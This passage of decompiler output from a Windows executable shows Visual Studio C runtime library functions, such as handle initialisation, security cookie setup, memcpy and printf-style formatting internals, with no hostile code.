  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x410a56;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_00410c95:
    iVar7 = -1;
  }
  else {
    DAT_00424fd8 = 0x20;
    DAT_00424fe0 = puVar2;
    for (; puVar2 < DAT_00424fe0 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_00424fd8 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_00424fd8,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_00424fe0)[local_24] = puVar2;
        DAT_00424fd8 = DAT_00424fd8 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_00424fe0)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_00424fe0)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_00410c95;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_00424fe0 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_00410c95;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_00424fd8);
    iVar7 = 0;
  }
  return iVar7;
}



// WARNING: Removing unreachable block (ram,0x00410cb2)
// WARNING: Removing unreachable block (ram,0x00410cb8)
// WARNING: Removing unreachable block (ram,0x00410cba)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00422040 == 0xbb40e64e) || ((DAT_00422040 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00422040 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00422040 == 0xbb40e64e) {
      DAT_00422040 = 0xbb40e64f;
    }
    else if ((DAT_00422040 & 0xffff0000) == 0) {
      DAT_00422040 = DAT_00422040 | DAT_00422040 << 0x10;
    }
    DAT_00422044 = ~DAT_00422040;
  }
  else {
    DAT_00422044 = ~DAT_00422040;
  }
  return;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x00410f77)
// WARNING: Removing unreachable block (ram,0x00410f64)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  errno_t eVar6;
  int iVar7;
  undefined *puVar8;
  int extraout_ECX;
  byte *pbVar9;
  char *pcVar10;
  int *piVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  FILE *local_264;
  int local_260;
  int local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_264 = _File;
  local_228 = (int **)_ArgList;
  local_260 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_25c = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File == (FILE *)0x0) {
switchD_004111e1_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_00422d78;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar8 = &DAT_00422d78;
        }
        else {
          puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)uVar4 >> 5]);
        }
        if ((puVar8[0x24] & 0x80) == 0) goto LAB_00411153;
      }
      goto switchD_004111e1_caseD_9;
    }
LAB_00411153:
    if (_Format == (char *)0x0) goto switchD_004111e1_caseD_9;
    local_215 = *_Format;
    local_22c = 0;
    local_224 = (int *)0x0;
    local_244 = 0;
    local_258 = (int *)0x0;
    if (local_215 == 0) {
LAB_00411bd5:
      if (local_248 != '\0') {
        *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
      }
      goto LAB_00411bee;
    }
    do {
      pbVar9 = (byte *)_Format + 1;
      uVar4 = 0;
      local_240 = pbVar9;
      if (local_22c < 0) break;
      if ((byte)(local_215 - 0x20) < 0x59) {
        uVar4 = (byte)(&DAT_0041cb00)[(char)local_215] & 0xf;
      }
      local_244 = (uint)((byte)(&DAT_0041cb20)[local_244 + uVar4 * 9] >> 4);
      switch(local_244) {
      case 0:
switchD_004111e1_caseD_0:
        local_23c = 0;
        iVar7 = __isleadbyte_l((uint)local_215,&local_254);
        if (iVar7 != 0) {
          _write_char(local_264);
          local_240 = (byte *)_Format + 2;
          if (*pbVar9 == 0) goto switchD_004111e1_caseD_9;
        }
        _write_char(local_264);
        break;
      case 1:
        local_21c = (int *)0xffffffff;
        local_270 = 0;
        local_25c = 0;
        local_238 = (int *)0x0;
        local_234 = 0;
        local_214 = 0;
        local_23c = 0;
        break;
      case 2:
        if (local_215 == 0x20) {
          local_214 = local_214 | 2;
        }
        else if (local_215 == 0x23) {
          local_214 = local_214 | 0x80;
        }
        else if (local_215 == 0x2b) {
          local_214 = local_214 | 1;
        }
        else if (local_215 == 0x2d) {
          local_214 = local_214 | 4;
        }
        else if (local_215 == 0x30) {
          local_214 = local_214 | 8;
        }
        break;
      case 3:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_238 = *(int **)_ArgList;
          if ((int)local_238 < 0) {
            local_214 = local_214 | 4;
            local_238 = (int *)-(int)local_238;
          }
        }
        else {
          local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 4:
        local_21c = (int *)0x0;
        break;
      case 5:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_21c = *(int **)_ArgList;
          if ((int)local_21c < 0) {
            local_21c = (int *)0xffffffff;
          }
        }
        else {
          local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 6:
        if (local_215 == 0x49) {
          bVar1 = *pbVar9;
          if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
            local_214 = local_214 | 0x8000;
            local_240 = (byte *)_Format + 3;
          }
          else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
            local_214 = local_214 & 0xffff7fff;
            local_240 = (byte *)_Format + 3;
          }
          else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                   ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
            local_244 = 0;
            goto switchD_004111e1_caseD_0;
          }
        }
        else if (local_215 == 0x68) {
          local_214 = local_214 | 0x20;
        }
        else if (local_215 == 0x6c) {
          if (*pbVar9 == 0x6c) {
            local_214 = local_214 | 0x1000;
            local_240 = (byte *)_Format + 2;
          }
          else {
            local_214 = local_214 | 0x10;
          }
        }
        else if (local_215 == 0x77) {
          local_214 = local_214 | 0x800;
        }
        break;
      case 7:
        if ((char)local_215 < 'e') {
          if (local_215 == 100) {
LAB_004116cd:
            local_214 = local_214 | 0x40;
LAB_004116d4:
            local_224 = (int *)0xa;
LAB_004116de:
            if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x20) == 0) {
                piVar3 = *(int **)_ArgList;
                if ((local_214 & 0x40) == 0) {
                  piVar11 = (int *)0x0;
                }
                else {
                  piVar11 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                if ((local_214 & 0x40) == 0) {
                  piVar3 = (int *)(uint)*(ushort *)_ArgList;
                }
                else {
                  piVar3 = (int *)(int)*(short *)_ArgList;
                }
                piVar11 = (int *)((int)piVar3 >> 0x1f);
              }
            }
            else {
              local_228 = (int **)((int)_ArgList + 8);
              piVar3 = *(int **)_ArgList;
              piVar11 = *(int **)((int)_ArgList + 4);
            }
            if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
              bVar12 = piVar3 != (int *)0x0;
              piVar3 = (int *)-(int)piVar3;
              piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar12);
              local_214 = local_214 | 0x100;
            }
            uVar13 = CONCAT44(piVar11,piVar3);
            if ((local_214 & 0x9000) == 0) {
              piVar11 = (int *)0x0;
            }
            if ((int)local_21c < 0) {
              local_21c = (int *)0x1;
            }
            else {
              local_214 = local_214 & 0xfffffff7;
              if (0x200 < (int)local_21c) {
                local_21c = (int *)0x200;
              }
            }
            if (((uint)piVar3 | (uint)piVar11) == 0) {
              local_234 = 0;
            }
            piVar3 = (int *)local_11;
            while( true ) {
              piVar15 = piVar11;
              piVar11 = (int *)((int)local_21c + -1);
              if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
              local_21c = piVar11;
              uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,(int)local_224 >> 0x1f)
              ;
              iVar7 = extraout_ECX + 0x30;
              if (0x39 < iVar7) {
                iVar7 = iVar7 + local_260;
              }
              *(char *)piVar3 = (char)iVar7;
              piVar3 = (int *)((int)piVar3 + -1);
              piVar11 = (int *)((ulonglong)uVar13 >> 0x20);
              local_268 = piVar15;
            }
            local_224 = (int *)(local_11 + -(int)piVar3);
            local_220 = (int *)((int)piVar3 + 1);
            local_21c = piVar11;
            if (((local_214 & 0x200) != 0) &&
               ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
              *(char *)piVar3 = '0';
              local_224 = (int *)(local_11 + -(int)piVar3 + 1);
              local_220 = piVar3;
            }
          }
          else if ((char)local_215 < 'T') {
            if (local_215 == 0x53) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
              goto LAB_004114fc;
            }
            if (local_215 == 0x41) {
LAB_0041147a:
              local_215 = local_215 + 0x20;
              local_270 = 1;
LAB_0041148d:
              local_214 = local_214 | 0x40;
              local_268 = (int *)0x200;
              piVar3 = local_210;
              piVar11 = local_268;
              piVar15 = local_210;
              if ((int)local_21c < 0) {
                local_21c = (int *)0x6;
              }
              else if (local_21c == (int *)0x0) {
                if (local_215 == 0x67) {
                  local_21c = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_21c) {
                  local_21c = (int *)0x200;
                }
                if (0xa3 < (int)local_21c) {
                  piVar11 = (int *)((int)local_21c + 0x15d);
                  local_220 = local_210;
                  local_258 = (int *)__malloc_crt((size_t)piVar11);
                  piVar3 = local_258;
                  piVar15 = local_258;
                  if (local_258 == (int *)0x0) {
                    local_21c = (int *)0xa3;
                    piVar3 = local_210;
                    piVar11 = local_268;
                    piVar15 = local_220;
                  }
                }
              }
              local_220 = piVar15;
              local_268 = piVar11;
              local_228 = (int **)((int)_ArgList + 8);
              local_27c = *(int **)_ArgList;
              local_278 = *(int **)((int)_ArgList + 4);
              plVar18 = &local_254;
              iVar7 = (int)(char)local_215;
              ppiVar14 = &local_27c;
              piVar11 = piVar3;
              piVar15 = local_268;
              piVar16 = local_21c;
              uVar17 = local_270;
              pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df8);
              (*pcVar5)(ppiVar14,piVar11,piVar15,iVar7,piVar16,uVar17,plVar18);
              uVar4 = local_214 & 0x80;
              if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422e04);
                (*pcVar5)(piVar11,plVar18);
              }
              if ((local_215 == 0x67) && (uVar4 == 0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422e00);
                (*pcVar5)(piVar11,plVar18);
              }
              if (*(char *)piVar3 == '-') {
                local_214 = local_214 | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_220 = piVar3;
              }
LAB_0041162f:
              local_224 = (int *)_strlen((char *)piVar3);
            }
            else if (local_215 == 0x43) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
LAB_0041156f:
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x810) == 0) {
                local_210[0]._0_1_ = *_ArgList;
                local_224 = (int *)0x1;
              }
              else {
                eVar6 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList);
                if (eVar6 != 0) {
                  local_25c = 1;
                }
              }
              local_220 = local_210;
            }
            else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_0041147a;
          }
          else {
            if (local_215 == 0x58) goto LAB_00411830;
            if (local_215 == 0x5a) {
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              if ((piVar3 == (int *)0x0) || (local_220 = (int *)piVar3[1], local_220 == (int *)0x0))
              {
                local_220 = (int *)PTR_DAT_00422db8;
                piVar3 = (int *)PTR_DAT_00422db8;
                goto LAB_0041162f;
              }
              local_224 = (int *)(int)*(wchar_t *)piVar3;
              if ((local_214 & 0x800) == 0) {
                local_23c = 0;
              }
              else {
                local_224 = (int *)((int)local_224 / 2);
                local_23c = 1;
              }
            }
            else {
              if (local_215 == 0x61) goto LAB_0041148d;
              if (local_215 == 99) goto LAB_0041156f;
            }
          }
LAB_00411a09:
          if (local_25c == 0) {
            if ((local_214 & 0x40) != 0) {
              if ((local_214 & 0x100) == 0) {
                if ((local_214 & 1) == 0) {
                  if ((local_214 & 2) == 0) goto LAB_00411a52;
                  local_230 = 0x20;
                }
                else {
                  local_230 = 0x2b;
                }
              }
              else {
                local_230 = 0x2d;
              }
              local_234 = 1;
            }
LAB_00411a52:
            pcVar10 = (char *)((int)local_238 + (-local_234 - (int)local_224));
            if ((local_214 & 0xc) == 0) {
              _write_multi_char(0x20,(int)pcVar10,local_264);
            }
            pFVar2 = local_264;
            _write_string(local_234);
            if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
              _write_multi_char(0x30,(int)pcVar10,pFVar2);
            }
            if ((local_23c == 0) || ((int)local_224 < 1)) {
              _write_string((int)local_224);
            }
            else {
              local_268 = local_224;
              piVar3 = local_220;
              do {
                _WCh = *(wchar_t *)piVar3;
                local_268 = (int *)((int)local_268 + -1);
                piVar3 = (int *)((int)piVar3 + 2);
                eVar6 = _wctomb_s(&local_274,local_11 + 1,6,_WCh);
                if ((eVar6 != 0) || (local_274 == 0)) {
                  local_22c = -1;
                  break;
                }
                _write_string(local_274);
              } while (local_268 != (int *)0x0);
            }
            if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
              _write_multi_char(0x20,(int)pcVar10,pFVar2);
            }
          }
        }
        else {
          if ('p' < (char)local_215) {
            if (local_215 == 0x73) {
LAB_004114fc:
              piVar3 = local_21c;
              if (local_21c == (int *)0xffffffff) {
                piVar3 = (int *)0x7fffffff;
              }
              local_228 = (int **)((int)_ArgList + 4);
              local_220 = *(int **)_ArgList;
              if ((local_214 & 0x810) == 0) {
                local_224 = local_220;
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_DAT_00422db8;
                  local_224 = (int *)PTR_DAT_00422db8;
                }
                for (; (piVar3 != (int *)0x0 &&
                       (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                    local_224 = (int *)((int)local_224 + 1)) {
                }
                local_224 = (int *)((int)local_224 - (int)local_220);
              }
              else {
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_u__null__00422dbc;
                }
                local_23c = 1;
                for (piVar11 = local_220;
                    (piVar3 != (int *)0x0 &&
                    (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar11 != L'\0'));
                    piVar11 = (int *)((int)piVar11 + 2)) {
                }
                local_224 = (int *)((int)piVar11 - (int)local_220 >> 1);
              }
              goto LAB_00411a09;
            }
            if (local_215 == 0x75) goto LAB_004116d4;
            if (local_215 != 0x78) goto LAB_00411a09;
            local_260 = 0x27;
LAB_0041185c:
            local_224 = (int *)0x10;
            if ((local_214 & 0x80) != 0) {
              local_22f = (char)local_260 + 'Q';
              local_230 = 0x30;
              local_234 = 2;
            }
            goto LAB_004116de;
          }
